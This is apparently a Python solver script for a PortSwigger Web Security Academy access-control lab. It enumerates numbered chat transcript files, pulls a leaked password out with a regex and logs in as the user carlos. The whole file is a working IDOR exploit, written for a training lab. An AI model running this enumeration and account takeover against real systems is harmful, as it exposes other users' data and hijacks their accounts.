#!/usr/bin/env python3
"""
Insecure direct object references
PortSwigger Web Security Academy -- Access Control

Companion script for the writeup: 09-insecure-direct-object-references.md

What this does:
    Sweeps low-numbered /download-transcript/<N>.txt files directly, without
    generating a transcript first -- if the numbering is global and
    incrementing, low numbers belong to other users' (or the site's seeded)
    conversations and are already sitting on disk with no ownership check.
    Regex-matches "password is <value>" out of the first real transcript
    found, then logs in as carlos with the recovered password.

Usage:
    python 09-insecure-direct-object-references.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx


def get_csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def login(client: httpx.Client, base: str, username: str, password: str) -> httpx.Response:
    login_page = client.get(f"{base}/login")
    csrf = get_csrf(login_page.text)
    return client.post(f"{base}/login", data={"csrf": csrf, "username": username, "password": password})


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    for i in range(1, 10):
        url = f"{lab_url}/download-transcript/{i}.txt"
        resp = client.get(url)
        if resp.status_code == 200 and len(resp.text) > 10:
            print(f"[+] Found transcript {i}: {resp.text[:200]}")

            pw_match = re.search(r'password\s+is\s+(\S+)', resp.text, re.IGNORECASE)
            if not pw_match:
                pw_match = re.search(r'password:\s*(\S+)', resp.text, re.IGNORECASE)

            if pw_match:
                password = pw_match.group(1).rstrip(".")
                print(f"[+] Found password: {password}")

                login(client, lab_url, "carlos", password)

                check = client.get(lab_url)
                if "Congratulations" in check.text:
                    print("[+] Lab solved -- logged in as carlos with the leaked transcript password.")
                    return
                else:
                    print("[-] Login with this password did not solve the lab, continuing sweep.")

    print("[-] Could not find a useful transcript in the swept range.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
